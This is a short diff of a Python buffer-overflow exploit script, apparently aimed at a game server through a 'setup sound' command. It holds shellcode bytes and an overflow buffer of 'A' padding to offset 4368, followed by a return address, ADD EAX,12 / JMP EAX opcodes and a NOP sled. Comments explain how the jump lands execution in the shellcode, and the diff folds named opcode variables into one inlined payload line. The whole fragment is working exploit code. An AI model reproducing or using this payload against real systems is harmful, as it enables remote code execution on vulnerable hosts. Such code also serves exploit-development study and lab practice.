@@ -29,14 +29,6 @@ shellcode = ("\xdd\xc1\xba\x23\x27\xcb\xe2\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
 
 # The x86 opcode instructions says ADD,EAX,12 Bytes (shift offset by 12 bytes), and then JMP EAX
 # That lands right into the beginning of the shellcode and the return address is the location of the buffer of A's
-# in msf-nasm_shell, add eax,12 which equals 83c00c
-# jmp eax, which equals ffe0
-
-ADD_EAX_12 = "\x83\xC0\x0C"
-JMP_EAX = "\xFF\xE0"
-NOP_SLED = "\x90\x90"
-NULL_TERMINATOR = "\x90\x00#"
-crash = shellcode + "A" * (4368-105) + ret + ADD_EAX_12 + JMP_EAX + NOP_SLED + NULL_TERMINATOR
 crash = shellcode +  "\x41" * (4368-105) + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"
 
 buffer = "\x11(setup sound " + crash + "\x90\x00#"
